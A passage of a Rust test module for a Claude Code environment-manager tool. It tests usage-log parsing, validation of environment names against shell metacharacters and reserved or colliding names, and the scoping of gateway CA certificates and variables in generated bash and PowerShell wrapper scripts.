            .map(|v| serde_json::to_string(v).unwrap())
            .collect::<Vec<_>>()
            .join("\n");
        fs::write(&f, body).unwrap();
        (f, dir)
    }

    // 测试用的行构造器：参数多但每个都对应 JSONL 的一个字段，
    // 抽成结构体只是把简单事写复杂，故显式允许。
    #[allow(clippy::too_many_arguments)]
    fn assistant_line(
        id: &str,
        model: &str,
        stop_reason: Option<&str>,
        ts: &str,
        input: u64,
        output: u64,
        cache_read: u64,
        cache_create: u64,
    ) -> serde_json::Value {
        let mut message = serde_json::json!({
            "id": id,
            "model": model,
            "usage": {
                "input_tokens": input,
                "output_tokens": output,
                "cache_read_input_tokens": cache_read,
                "cache_creation_input_tokens": cache_create
            }
        });
        if let Some(sr) = stop_reason {
            message["stop_reason"] = serde_json::json!(sr);
        }
        serde_json::json!({ "type": "assistant", "timestamp": ts, "message": message })
    }

    #[test]
    fn parse_usage_file_dedups_identical_block_lines() {
        // 真实数据的主导形态：多内容块消息逐块写行，同 message.id 的多行
        // usage/stop_reason 完全相同（实测样本 msg_202609041433383dbf0a0121d948df）
        let entry = assistant_line(
            "msg_dup_1",
            "claude-sonnet-4-5",
            Some("tool_use"),
            "2026-09-04T06:12:00Z",
            10925,
            484,
            39872,
            0,
        );
        let (f, dir) = write_usage_fixture(&[entry.clone(), entry.clone(), entry.clone()]);
        let (rows, convs) = parse_usage_file("p1", &f);
        assert_eq!(convs.len(), 0);
        assert_eq!(rows.len(), 1);
        let r = &rows[0];
        assert_eq!(r.requests, 1, "同 id 三行只计一次调用");
        assert_eq!(r.input, 10925, "输入不因重复行膨胀 3 倍");
        assert_eq!(r.output, 484);
        assert_eq!(r.cache_read, 39872);
        assert_eq!(r.cache_create, 0);
        fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn parse_usage_file_prefers_final_entry_over_stream_snapshot() {
        // 流式形态：先写无 stop_reason 的快照行（output 为中间值），后写终行。
        // 必须取终行,且时间桶用终行时间戳(旧实现会在 05/06 两个桶各记一次)
        let snapshot = assistant_line(
            "msg_snap",
            "claude-opus-4-6",
            None,
            "2026-09-04T05:59:00Z",
            100,
            1,
            5000,
            100,
        );
        let final_line = assistant_line(
            "msg_snap",
            "claude-opus-4-6",
            Some("end_turn"),
            "2026-09-04T06:01:00Z",
            100,
            150,
            5000,
            100,
        );
        let (f, dir) = write_usage_fixture(&[snapshot, final_line]);
        let (rows, _) = parse_usage_file("p1", &f);
        assert_eq!(rows.len(), 1, "快照+终行只入一个桶");
        let r = &rows[0];
        assert_eq!(r.datetime, "2026-09-04T06", "时间取终行时间戳");
        assert_eq!(r.requests, 1);
        assert_eq!(r.output, 150, "output 取终行完整值而非快照中间值");
        assert_eq!(r.input, 100);
        assert_eq!(r.cache_read, 5000);
        assert_eq!(r.cache_create, 100);
        fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn parse_usage_file_keeps_snapshot_only_short_requests() {
        // 并行短命请求可能只有快照行(无 stop_reason)没有终行,但其
        // input/cache 已真实计费,必须保留(cc-switch 实测低估 4.1% 的教训)
        let (f, dir) = write_usage_fixture(&[assistant_line(
            "msg_short",
            "claude-haiku-4-5",
            None,
            "2026-09-04T06:00:00Z",
            3,
            1,
            5000,
            0,
        )]);
        let (rows, _) = parse_usage_file("p1", &f);
        assert_eq!(rows.len(), 1);
        assert_eq!(rows[0].requests, 1);
        assert_eq!(rows[0].input, 3);
        assert_eq!(rows[0].cache_read, 5000);
        fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn parse_usage_file_skips_zero_usage_and_counts_user_questions() {
        // 对话次数只计用户真实提问;工具返回、全零 usage、<synthetic> 均不计
        let question = serde_json::json!({
            "type": "user",
            "message": { "content": [{ "type": "text", "text": "帮我看看这个问题" }] },
            "timestamp": "2026-09-04T06:00:00Z"
        });
        let tool_result = serde_json::json!({
            "type": "user",
            "message": { "content": [{ "type": "tool_result", "tool_use_id": "t1" }] },
            "timestamp": "2026-09-04T06:01:00Z"
        });
        let zero_usage = assistant_line(
            "msg_zero",
            "m",
            Some("end_turn"),
            "2026-09-04T06:02:00Z",
            0,
            0,
            0,
            0,
        );
        let synthetic = assistant_line(
            "msg_syn",
            "<synthetic>",
            Some("end_turn"),
            "2026-09-04T06:03:00Z",
            10,
            5,
            0,
            0,
        );
        let (f, dir) = write_usage_fixture(&[question, tool_result, zero_usage, synthetic]);
        let (rows, convs) = parse_usage_file("p1", &f);
        assert_eq!(convs.len(), 1, "只计一次真实提问,工具返回不计");
        assert_eq!(convs[0].datetime, "2026-09-04T06");
        assert!(rows.is_empty(), "全零 usage 与 <synthetic> 不产生用量行");
        fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn parse_usage_file_buckets_by_hour_and_model() {
        // 不同 (小时, 模型) 分桶;requests 按去重后的消息数计
        let (f, dir) = write_usage_fixture(&[
            assistant_line(
                "m1",
                "sonnet",
                Some("end_turn"),
                "2026-09-04T05:59:00Z",
                10,
                5,
                0,
                0,
            ),
            assistant_line(
                "m2",
                "opus",
                Some("end_turn"),
                "2026-09-04T05:58:00Z",
                7,
                3,
                0,
                0,
            ),
            assistant_line(
                "m3",
                "sonnet",
                Some("end_turn"),
                "2026-09-04T06:30:00Z",
                1,
                1,
                0,
                0,
            ),
        ]);
        let (rows, _) = parse_usage_file("p1", &f);
        assert_eq!(rows.len(), 3);
        assert!(rows.iter().all(|r| r.requests == 1));
        fs::remove_dir_all(dir).unwrap();
    }

    #[test]
    fn valid_name_accepts_ascii_word_chars() {
        assert!(valid_name("bj"));
        assert!(valid_name("corp-2"));
        assert!(valid_name("a_b_c"));
        assert!(valid_name(&"x".repeat(40)));
    }

    #[test]
    fn valid_name_rejects_unsafe_or_empty() {
        assert!(!valid_name(""));
        assert!(!valid_name(&"x".repeat(41)));
        assert!(!valid_name("has space"));
        // 会破坏 bash case 分支语法
        assert!(!valid_name("bad)name"));
        // 会破坏命令分隔/变量展开
        assert!(!valid_name("semi;colon"));
        assert!(!valid_name("dollar$var"));
        assert!(!valid_name("中文"));
    }

    #[test]
    fn valid_name_rejects_reserved_names() {
        // __ 前缀保留给内部哨兵值(__all__ / __main__)
        assert!(!valid_name("__all__"));
        assert!(!valid_name("__main__"));
        assert!(!valid_name("__x"));
        assert!(valid_name("_single_underscore_ok"));
        // Windows 保留设备名（大小写不敏感）
        assert!(!valid_name("con"));
        assert!(!valid_name("NUL"));
        assert!(!valid_name("Com3"));
        assert!(!valid_name("lpt9"));
        // 非保留的相似名放行
        assert!(valid_name("com0"));
        assert!(valid_name("com10"));
        assert!(valid_name("console"));
    }

    #[test]
    fn valid_name_rejects_claude_subcommands() {
        // 约束 9（见 docs/产品模型与不可破坏约束-2026-09-12.md）：环境名不能与 Claude 官方
        // 子命令同名 —— 生成的 shell 函数用 `case "$1"` 匹配环境名，
        // 环境一旦叫 mcp，`claude mcp add ...` 就会被当成"切到 mcp 环境"。
        for name in [
            "mcp",
            "doctor",
            "update",
            "upgrade",
            "plugin",
            "plugins",
            "auth",
            "rm",
            "logs",
            "project",
            "agents",
            "install",
            "import",
            "gateway",
            "setup-token",
        ] {
            assert!(!valid_name(name), "{name} 应被拒：会劫持 Claude 官方子命令");
        }
        // 大小写不敏感：`MCP` 严格说不劫持 `claude mcp`，但"我建了 MCP 环境却敲不进去"只会更困惑
        assert!(!valid_name("MCP"));
        assert!(!valid_name("Doctor"));

        // 近似名不受影响，别误伤
        assert!(valid_name("mcps"));
        assert!(valid_name("my-mcp"));
        assert!(valid_name("doctor2"));
        assert!(valid_name("updates"));
    }

    #[test]
    fn claude_subcommand_list_is_normalized() {
        // 名单抄自 `claude --help` 的 Commands 段（本机实测）。这条钉住它的"形态"：
        // 全小写、无重复、无空白 —— 随手改动会破坏大小写不敏感的比对。
        let mut sorted = CLAUDE_SUBCOMMANDS.to_vec();
        sorted.sort_unstable();
        sorted.dedup();
        assert_eq!(sorted.len(), CLAUDE_SUBCOMMANDS.len(), "名单里有重复项");
        assert_eq!(sorted, CLAUDE_SUBCOMMANDS.to_vec(), "名单不是有序的");
        for name in CLAUDE_SUBCOMMANDS {
            assert_eq!(
                name,
                name.trim().to_ascii_lowercase(),
                "{name} 应全小写且无空白"
            );
        }
    }

    #[test]
    fn script_safe_name_grandfathers_legacy_but_blocks_metachars() {
        // 旧规则时代的合法名字继续放行（不能让老用户的命令词升级后失效）
        assert!(script_safe_name("中文"));
        assert!(script_safe_name("gw.corp"));
        assert!(script_safe_name("bj"));
        // 会破坏脚本语法的一律拦下
        assert!(!script_safe_name(""));
        assert!(!script_safe_name("a b"));
        assert!(!script_safe_name("bad)name"));
        assert!(!script_safe_name("semi;colon"));
        assert!(!script_safe_name("dollar$var"));
        assert!(!script_safe_name("quo'te"));
        assert!(!script_safe_name("multi\nline"));
    }

    #[test]
    fn generate_sh_creates_case_branch_for_each_profile() {
        let list = vec![router_profile("corp"), account_profile("alt")];
        let script = generate_sh(&list);
        assert!(script.contains("claude() {"));
        assert!(script.contains("    corp)\n"));
        assert!(script.contains("    alt)\n"));
        assert!(script.contains("ANTHROPIC_BASE_URL="));
        assert!(script.contains("ANTHROPIC_DEFAULT_OPUS_MODEL="));
    }

    #[test]
    fn generate_sh_skips_empty_and_unsafe_names() {
        // 空名 / 不安全名都不该产生 case 分支：输出必须与空列表逐字节一致
        let list = vec![
            account_profile(""),
            router_profile("bad)name"),
            account_profile("a b"),
        ];
        assert_eq!(generate_sh(&list), generate_sh(&[]));
        assert_eq!(generate_ps1(&list), generate_ps1(&[]));
    }

    #[test]
    fn generate_sh_handles_empty_profile_list() {
        let script = generate_sh(&[]);
        assert!(script.contains("claude() {"));
        assert!(script.contains("*) command claude \"$@\" ;;"));
    }

    // ---- 约束 1：默认 `claude` 必须零副作用透传（偏差 1 + 偏差 4）----
    //
    // 两条独立的要求，都要钉住：
    //   1. 脚本**加载时（source / dot-source）不产生任何副作用** ——
    //      旧实现会在顶层 `export NODE_EXTRA_CA_CERTS`，于是终端里所有 Node
    //      程序（包括直接敲的 `claude`）都被动获得了网关 CA。
    //   2. 默认分支**不调 --sync** —— 旧实现在 `claude` 前后各跑一次，
    //      等于"只是敲个 claude"也会触发配置同步写入。

    /// 脚本头部（`claude()` 函数定义之前）必须什么都不做。
    fn assert_no_load_time_side_effects(script: &str, fn_marker: &str) {
        let head = script
            .split(fn_marker)
            .next()
            .expect("脚本里找不到函数定义标记");
        assert!(
            !head.contains("NODE_EXTRA_CA_CERTS"),
            "脚本加载时不得设置 CA 环境变量，头部为：{head}"
        );
        assert!(
            !head.contains("export ") && !head.contains("$env:"),
            "脚本加载时不得导出/设置任何环境变量，头部为：{head}"
        );
    }

    #[test]
    fn generated_scripts_have_no_load_time_side_effects() {
        let list = vec![router_profile("corp"), account_profile("alt")];
        assert_no_load_time_side_effects(&generate_sh(&list), "claude() {");
        assert_no_load_time_side_effects(&generate_ps1(&list), "function claude");
    }

    #[test]
    fn default_claude_branch_is_a_pure_passthrough() {
        let list = vec![router_profile("corp")];
        let sh = generate_sh(&list);
        let default_line = sh
            .lines()
            .find(|l| l.trim_start().starts_with("*)"))
            .expect("sh 脚本里找不到 *) 默认分支");
        assert_eq!(default_line.trim(), r#"*) command claude "$@" ;;"#);
        assert!(
            !sh.contains("*) _ccm_sync"),
            "默认 `claude` 不得触发配置同步"
        );

        let ps1 = generate_ps1(&list);
        let default_line = ps1
            .lines()
            .find(|l| l.trim_start().starts_with("default {"))
            .expect("ps1 脚本里找不到 default 分支");
        assert!(
            !default_line.contains("_ccmSync"),
            "默认 `claude` 不得触发配置同步：{default_line}"
        );
        assert!(default_line.contains("& $exe @args"), "{default_line}");
    }

    #[test]
    fn ca_is_injected_only_into_gateway_environments() {
        // 网关环境要拿到 CA；独立登录环境与默认分支都不该碰它。
        let list = vec![router_profile("corp"), account_profile("alt")];
        let sh = generate_sh(&list);
        // case 分支以 `;;` 结束，取该环境分支的函数体
        let sh_body = |name: &str| {
            sh.split(&format!("    {name})"))
                .nth(1)
                .and_then(|rest| rest.split(";;").next())
                .unwrap_or("")
                .to_string()
        };
        let corp = sh_body("corp");
        let alt = sh_body("alt");
        assert!(!corp.is_empty() && !alt.is_empty(), "找不到环境分支");
        // 注入的必须是**该网关自己的** bundle（约束 5：网关之间 CA 彼此隔离）
        assert!(
            corp.contains("export NODE_EXTRA_CA_CERTS=\"$HOME/.cc-manager/ca/corp.pem\""),
            "网关环境必须注入自己的 CA bundle：{corp}"
        );
        assert!(
            !corp.contains("ca-cert.pem"),
            "还在使用那个全局共享的 CA 文件（正是审查第 3 条的缺陷）：{corp}"
        );
        // 必须是子 shell 内注入：否则 CA 会漏进父 shell，污染默认 claude 与其他 Node 程序
        let before_ca = corp
            .split("export NODE_EXTRA_CA_CERTS")
            .next()
            .unwrap_or("");
        assert!(
            before_ca.lines().any(|l| l.trim() == "("),
            "CA 必须注入在子 shell 内（否则会漏给父 shell）：{corp}"
        );
        // 独立登录环境不是"不提 CA"，而是**必须把整组受管变量清掉** ——
        // 不清的话父 shell 的网关地址/Key/CA 会静默继承进来（审查第 2 条）。
        for body in [&corp, &alt] {
            let unset_line = body
                .lines()
                .find(|l| l.trim_start().starts_with("unset "))
                .unwrap_or("");
            assert!(
                !unset_line.is_empty(),
                "分支里没有封闭变量集的 unset 行：{body}"
            );
            for var in MANAGED_ENV {
                assert!(unset_line.contains(var), "封闭变量集漏了 {var}：{body}");
            }
        }

        let ps1 = generate_ps1(&list);
        let ps1_body = |name: &str| {
            ps1.split(&format!("'{}' {{", name))
                .nth(1)
                .and_then(|rest| rest.split("\n    '").next())
                .unwrap_or("")
                .to_string()
        };
        let ps_corp = ps1_body("corp");
        let ps_alt = ps1_body("alt");
        assert!(
            ps_corp.contains(
                "$env:NODE_EXTRA_CA_CERTS = \"$env:USERPROFILE\\.cc-manager\\ca\\corp.pem\""
            ),
            "网关环境必须注入自己的 CA bundle：{ps_corp}"
        );
        assert!(
            !ps_corp.contains("ca-cert.pem"),
            "还在使用那个全局共享的 CA 文件：{ps_corp}"
        );
        // PowerShell 侧同样是"封闭集合"：两个分支都要先清空整组受管变量，
        // 且把"存在性"记进还原基线（不能只记值 —— 见下面那条断言）。
        for body in [&ps_corp, &ps_alt] {
            assert!(
                body.contains("foreach ($k in $managed) { Remove-Item -Path \"Env:\\$k\""),
                "分支没有先清空受管变量：{body}"
            );
            assert!(
                body.contains("if ($snapshot.ContainsKey($k)) { $bk[$k] = $snapshot[$k] }"),
                "还原基线必须按「存在性」记录（$env:X='' 在 Windows 上等于删除）：{body}"
            );
        }
        // 两个平台共用的受管变量清单必须都出现在生成脚本里，防集合漂移
        for var in MANAGED_ENV {
            assert!(
                ps1.contains(&format!("'{var}'")),
                "生成的 PowerShell 脚本漏了受管变量 {var}"
            );
        }
        // 退出码必须显式回写成调用方可见的值（#8 的落地方式）
        assert!(
            ps1.contains("$global:LASTEXITCODE = $code"),
            "环境分支必须把退出码回写给调用方"
        );
        assert!(
            ps1.contains("$exe @args; $global:LASTEXITCODE = $LASTEXITCODE"),
            "默认分支必须显式回写退出码"
        );
    }

    #[test]
    fn generate_ps1_creates_switch_branch_for_each_profile() {
        let list = vec![router_profile("corp")];
        let script = generate_ps1(&list);
        assert!(script.contains("function claude"));
        assert!(script.contains("'corp' {"));
        assert!(script.contains("ANTHROPIC_BASE_URL"));
    }

    // 光比对字符串挡不住"语法没坏但行为不对"，所以把生成脚本丢进**真 bash** 跑一遍。
    // 覆盖三件事：① 默认 `claude` 拿不到 CA；② 网关环境拿得到；③ 网关命令结束后
    // CA 不会残留在终端里（子 shell 的关键作用，也是最容易被改回去的一点）。
    // PATH **不能带上系统原有的目录**：一旦假 claude 没能被当成可执行文件，
    // `command claude` 会掉到真实的 Claude Code CLI 上并**真的把它启动起来**（本会话踩过）。
    // 所以只给 `bin:/usr/bin:/bin`，并**先自检** `claude` 解析到假的那个；解析不到就跳过。
    //
    // 全程用**相对路径**（cwd = 临时目录）：Git Bash 的 PATH 只认 POSIX 形式，
    // 塞 `C:/...` 进去会让 PATH 查找整个失效。
    //
    fn bash_candidates(
        windows: bool,
        git_home: Option<&std::ffi::OsStr>,
        program_files: Option<&std::ffi::OsStr>,
        program_files_x86: Option<&std::ffi::OsStr>,
    ) -> Vec<PathBuf> {
        let mut candidates = Vec::new();
        if windows {
            // Windows 自带的 `bash.exe` 是 WSL 启动器；GitHub Windows Runner 虽然
            // 预装了 Git Bash，但普通进程的 PATH 可能先命中 WSL。优先使用 Git
            // for Windows 的明确路径，才能真正执行下面的 POSIX shell 回归测试。
            if let Some(root) = git_home {
                candidates.push(PathBuf::from(root).join("bin/bash.exe"));
            }
            for root in [program_files, program_files_x86].into_iter().flatten() {
                let candidate = PathBuf::from(root).join("Git/bin/bash.exe");
                if !candidates.contains(&candidate) {
                    candidates.push(candidate);
                }
            }
        }
        candidates.push(PathBuf::from("bash"));
        candidates
    }

    fn test_bash_executable() -> Option<PathBuf> {
        for candidate in bash_candidates(
            cfg!(target_os = "windows"),
            std::env::var_os("GIT_HOME").as_deref(),
            std::env::var_os("ProgramFiles").as_deref(),
            std::env::var_os("ProgramFiles(x86)").as_deref(),
        ) {
            let Ok(out) = std::process::Command::new(&candidate)
                .arg("--version")
                .output()
            else {
                continue;
            };
            let version = format!(
                "{}{}",
                String::from_utf8_lossy(&out.stdout),
                String::from_utf8_lossy(&out.stderr)
            );
            if out.status.success() && version.to_ascii_lowercase().contains("gnu bash") {
                return Some(candidate);
            }
        }
        None
    }

    #[test]
    fn bash_candidates_prefer_git_for_windows_over_path_bash() {
        let candidates = bash_candidates(
            true,
            Some(std::ffi::OsStr::new(r"C:\hostedtoolcache\windows\Git")),
            Some(std::ffi::OsStr::new(r"C:\Program Files")),
            None,
        );
        assert_eq!(
            candidates,
            vec![
                PathBuf::from(r"C:\hostedtoolcache\windows\Git").join("bin/bash.exe"),
                PathBuf::from(r"C:\Program Files").join("Git/bin/bash.exe"),
                PathBuf::from("bash"),
            ]
        );
    }

    #[test]
    fn bash_candidates_use_path_bash_on_non_windows() {
        assert_eq!(
            bash_candidates(false, None, None, None),
            vec![PathBuf::from("bash")]
        );
    }

    fn sh_probe_temp_dir(nanos: u128) -> PathBuf {
        use std::sync::atomic::{AtomicU64, Ordering};

        // SystemTime 在部分 macOS Runner 上的实际分辨率低于纳秒。两个并行测试
        // 可能读到同一个时间值；若目录名只含 pid + 时间，其中一个测试清理目录时
        // 会删掉另一个仍在执行的假 claude。进程内序号保证即使时钟不走也不碰撞。
        static SEQUENCE: AtomicU64 = AtomicU64::new(0);
        let sequence = SEQUENCE.fetch_add(1, Ordering::Relaxed);
        std::env::temp_dir().join(format!(
            "ccm-sh-probe-{}-{nanos}-{sequence}",
            std::process::id()
        ))
    }

    #[test]
    fn sh_probe_temp_dirs_stay_unique_when_clock_value_repeats() {
        assert_ne!(sh_probe_temp_dir(42), sh_probe_temp_dir(42));
    }

    // 返回 None 表示本机跑不了（没有 GNU bash / 假 claude 进不了 PATH），调用方直接 return。
    fn probe_generated_sh(list: &[Profile], probe_body: &str) -> Option<(Vec<String>, String)> {
        let Some(bash) = test_bash_executable() else {
            eprintln!("跳过：本机没有 GNU bash");
            return None;
        };
        let dir = sh_probe_temp_dir(
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos(),
        );
        fs::create_dir_all(dir.join("home/.cc-manager")).unwrap();
        fs::create_dir_all(dir.join("bin")).unwrap();
        // CA 现在是**按网关**的：corp 有自己的 bundle；没有它的网关拿不到 CA
        fs::create_dir_all(dir.join("home/.cc-manager/ca")).unwrap();
        fs::write(dir.join("home/.cc-manager/ca/corp.pem"), "PEM").unwrap();
        // 假的 claude：把"它看到的环境"打出来，用来观察作用域、封闭性与参数透传。
        // 网关变量必须逐个显式打印 —— 只打印 CA 的话，第 2 条（变量集封闭）根本测不到。
        fs::write(
            dir.join("bin/claude"),
            "#!/bin/bash\nprintf 'CA=[%s] URL=[%s] TOK=[%s] OPUS=[%s] SONNET=[%s] HAIKU=[%s] DISABLE=[%s] CFG=[%s] ARGS=[%s]\\n' \
             \"$NODE_EXTRA_CA_CERTS\" \"$ANTHROPIC_BASE_URL\" \"$ANTHROPIC_AUTH_TOKEN\" \
             \"$ANTHROPIC_DEFAULT_OPUS_MODEL\" \"$ANTHROPIC_DEFAULT_SONNET_MODEL\" \
             \"$ANTHROPIC_DEFAULT_HAIKU_MODEL\" \"$CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC\" \
             \"$CLAUDE_CONFIG_DIR\" \"$*\"\n",
        )
        .unwrap();
        // 假的 security：网关环境的 Key 从钥匙串读；没有它，router 分支会按设计
        // 明确报错并返回非零（那是"凭据读取失败必须报错"的保护，不是测试失误）
        fs::write(dir.join("bin/security"), "#!/bin/bash\necho 'fake-token'\n").unwrap();
        // 测试只验证生成脚本的 Shell 行为，不能把 cargo test 自身当作同步程序再次
        // 启动；否则每次 _ccm_sync 都会递归运行测试，多个嵌套进程会争用并清理夹具。
        fs::write(
            dir.join("cc.sh"),
            generate_sh_for_executable(list, "/pathmux-test-sync-disabled"),
        )
        .unwrap();

        let probe = format!(
            "chmod +x \"bin/claude\" \"bin/security\" 2>/dev/null; \
             export PATH=\"bin:/usr/bin:/bin\"; \
             if [ \"$(command -v claude)\" != \"bin/claude\" ]; then echo SKIP; exit 3; fi; \
             . ./cc.sh; {probe_body}"
        );
        let out = std::process::Command::new(&bash)
            .arg("-c")
            .arg(&probe)
            .current_dir(&dir)
            // HOME 必须换掉，否则会读到这台机器真实的 ~/.cc-manager/ca-cert.pem；
            // NODE_EXTRA_CA_CERTS 也要清掉 —— 开发机的终端里很可能已经导出过它，
            // 留着会让"默认 claude 没被污染"这条断言假绿。
            .env("HOME", "home")
            .env_remove("NODE_EXTRA_CA_CERTS")
            .output()
            .expect("bash 未能启动");
        let stdout = String::from_utf8_lossy(&out.stdout).replace('\\', "/");
        let stderr = String::from_utf8_lossy(&out.stderr).to_string();
        let _ = fs::remove_dir_all(&dir);
        if out.status.code() == Some(3) {
            eprintln!("跳过：无法让假的 claude 参与 PATH 查找（{stderr}）");
            return None;
        }
        assert!(
            out.status.success(),
            "生成的脚本在 bash 下执行失败：{stdout} / {stderr}"
        );
        Some((
            stdout.lines().map(|l| l.trim().to_string()).collect(),
            stdout,
        ))
    }

    // 光比对字符串挡不住"语法没坏但行为不对"，所以把生成脚本丢进**真 bash** 跑一遍。
    // 覆盖三件事：① 默认 `claude` 拿不到 CA；② 网关环境拿得到；③ 网关命令结束后
    // CA 不会残留在终端里（子 shell 的关键作用，也是最容易被改回去的一点）。
    #[test]
    fn generated_sh_runs_and_scopes_ca_to_the_gateway_command_only() {
        // 父 shell 里先放一组"上一环境残留"的网关变量：
        //   - 默认 claude 必须**原样透传**（零干预）
        //   - 受管理环境必须**一个都不继承**（封闭变量集，审查第 2 条）
        // 不显式设置的话，测出来的其实是宿主机环境（本机开发终端里就带着
        // ANTHROPIC_BASE_URL —— 第一版测试正是因此假通过）。
        let Some((lines, stdout)) = probe_generated_sh(
            &[router_profile("corp"), account_profile("alt")],
            "export ANTHROPIC_BASE_URL='parent-url' ANTHROPIC_AUTH_TOKEN='parent-tok' \
               ANTHROPIC_DEFAULT_OPUS_MODEL='parent-opus' ANTHROPIC_DEFAULT_SONNET_MODEL='parent-sonnet' \
               ANTHROPIC_DEFAULT_HAIKU_MODEL='parent-haiku' CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC='parent-disable' \
               NODE_EXTRA_CA_CERTS='parent-ca'; \
             claude solo; echo -n 'AFTER_DEFAULT='; printf '%s\\n' \"$NODE_EXTRA_CA_CERTS\"; \
             claude corp routed; echo -n 'AFTER_GATEWAY='; printf '%s\\n' \"$NODE_EXTRA_CA_CERTS\"; \
             claude alt login",
        ) else {
            return;
        };
        let has = |line: &str, needle: &str| line.contains(needle);

        // ① 默认 claude：**零干预** —— 父级设置原样到达，参数原样透传
        for kept in [
            "URL=[parent-url]",
            "TOK=[parent-tok]",
            "OPUS=[parent-opus]",
            "DISABLE=[parent-disable]",
            "CA=[parent-ca]",
            "ARGS=[solo]",
        ] {
            assert!(
                has(&lines[0], kept),
                "默认 claude 被干预了（缺 {kept}）：{stdout}"
            );
        }
        // 默认 claude 之后，父 shell 的 CA 也不该被动过
        assert_eq!(lines[1], "AFTER_DEFAULT=parent-ca", "{stdout}");

        // ② 网关环境：换成该环境自己的值，未配置项清空（不继承父级）
        for own in [
            "URL=[https://gw.example.com/anthropic]",
            "TOK=[fake-token]",
            "OPUS=[opus-x]",
            "SONNET=[sonnet-x]",
            "HAIKU=[haiku-x]",
            "DISABLE=[1]",
            "ARGS=[routed]",
        ] {
            assert!(
                has(&lines[2], own),
                "网关环境变量不对（缺 {own}）：{stdout}"
            );
        }
        // CA 只注入给**该网关自己**的 bundle；只断言后缀，因为不同 bash 会把 HOME 归一化成绝对路径
        assert!(
            has(&lines[2], "home/.cc-manager/ca/corp.pem"),
            "网关环境没拿到 CA：{stdout}"
        );
        // 隔离本身：别的网关的 bundle 名不该出现在这个分支里
        assert!(
            !has(&lines[2], "ca/alt.pem"),
            "注入到了别的网关的 bundle：{stdout}"
        );
        // ③ 网关命令结束后 CA 必须消失 —— 这是子 shell 的关键作用
        assert_eq!(
            lines[3], "AFTER_GATEWAY=parent-ca",
            "CA 泄漏/破坏到了父 shell：{stdout}"
        );

        // ④ 独立登录环境：只该有 CLAUDE_CONFIG_DIR，父级的网关变量**一个都不能进**
        for cleared in [
            "CA=[]",
            "URL=[]",
            "TOK=[]",
            "OPUS=[]",
            "SONNET=[]",
            "HAIKU=[]",
            "DISABLE=[]",
            "ARGS=[login]",
        ] {
            assert!(
                has(&lines[4], cleared),
                "登录环境继承了调用者的网关变量（{cleared} 不成立）：{stdout}"
            );
        }
        assert!(
            has(&lines[4], ".claude-split/alt/.claude"),
            "登录环境没拿到自己的配置目录：{stdout}"
        );
    }

    // ---- 存量同名环境不得劫持 Claude 官方子命令 ----
    //
    // 真实失败链路（本机实测复现）：环境名叫 `mcp` 时，生成的 case 分支 `mcp)` 会先命中，
    // `shift` 把 `mcp` 吃掉，最终执行的是 `claude add myserver -s user` ——
    // 官方子命令**根本没有被调用**。

    #[test]
    fn can_have_terminal_entry_blocks_the_entry_but_never_the_data() {
        // 这条断言是防"顺手把判据并进 script_safe_name"的护栏：
        // script_safe_name 还被 stage_instance_data / delete_profile 使用，
        // 一旦它也拒绝 `mcp`，冲突环境就**删不掉**了 —— 比劫持更糟。
        assert!(script_safe_name("mcp"));
        assert!(script_safe_name("MCP"));
        assert!(!can_have_terminal_entry("mcp"));
        assert!(!can_have_terminal_entry("MCP"));
        // 普通环境不受影响
        assert!(can_have_terminal_entry("corp"));
        assert!(can_have_terminal_entry("我的环境"));
        // 不安全字符仍然两边都拦
        assert!(!script_safe_name("bad)name"));
        assert!(!can_have_terminal_entry("bad)name"));
    }

    #[test]
    fn generators_omit_terminal_branches_for_shadowing_names() {
        // 存量冲突环境（升级前建的）+ 一个普通环境
        let list = vec![router_profile("mcp"), router_profile("corp")];
        let sh = generate_sh(&list);
        assert!(
            !sh.contains("    mcp)"),
            "冲突环境仍然生成了 case 分支，官方子命令会被劫持"
        );
        assert!(sh.contains("    corp)"), "普通环境的入口不该被牵连");
        assert!(sh.contains("*) command claude \"$@\" ;;"));

        // PowerShell：`switch` 大小写不敏感（见下一条测试），所以 MCP 也必须排除
        for name in ["mcp", "MCP"] {
            let list = vec![router_profile(name), router_profile("corp")];
            let ps1 = generate_ps1(&list);
            assert!(
                !ps1.contains(&format!("    '{}' {{", name)),
                "冲突环境 {name} 仍然生成了 switch 分支"
            );
            assert!(ps1.contains("    'corp' {"), "普通环境的入口不该被牵连");
        }
    }

    #[test]
    fn generated_sh_lets_official_subcommands_through_when_an_env_shadows_them() {
        let list = vec![router_profile("mcp"), router_profile("corp")];
        let Some((lines, stdout)) =
            probe_generated_sh(&list, "claude mcp add myserver -s user; claude corp x")
        else {
            return;
        };
        // 官方子命令与它的全部参数必须原样到达 CLI（`mcp` 不能被 shift 掉）
        assert!(
            lines[0].starts_with("CA=[]"),
            "默认分支不该注入 CA：{stdout}"
        );
        assert!(
            lines[0].ends_with("ARGS=[mcp add myserver -s user]"),
            "官方 MCP 子命令被劫持或参数被改动：{stdout}"
        );
        // 普通环境的入口照常可用
        assert!(
            lines[1].ends_with("ARGS=[x]"),
            "普通环境入口被牵连了：{stdout}"
        );
    }

    // 真实 PowerShell 行为测试（#8 / #9 / #11）：把**生成的 cc.ps1** dot-source 进真
    // PowerShell 跑一遍，而不是只比对生成文本。只在本机有 PowerShell 时执行。
    //
    // 覆盖：① 退出码按原生进程回写（成功 0 / 失败保留原值）；
    //       ② 受管变量不继承调用者（封闭集合）；③ 命令结束后环境被还原。
    #[cfg(target_os = "windows")]
    #[test]
    fn generated_ps1_propagates_exit_code_and_restores_environment() {
        let dir = std::env::temp_dir().join(format!(
            "ccm-ps-probe-{}-{}",
            std::process::id(),
            std::time::SystemTime::now()
                .duration_since(std::time::UNIX_EPOCH)
                .unwrap()
                .as_nanos()
        ));
        let home = dir.join("home");
        let bin = dir.join("bin");
        fs::create_dir_all(&home).unwrap();
        fs::create_dir_all(&bin).unwrap();
        // 假的 claude.cmd：**打印它自己看到的网关变量**（这样才测得到"封闭集合"，
        // 读调用方的变量只会读到还原后的值），退出码由 CLAUDE_FAKE_EXIT 控制
        // （它不在受管集合里，不会被清）。
        fs::write(
            bin.join("claude.cmd"),
            "@echo off\r\n\
             echo CHILD_URL=[%ANTHROPIC_BASE_URL%]\r\n\
             echo CHILD_TOK=[%ANTHROPIC_AUTH_TOKEN%]\r\n\
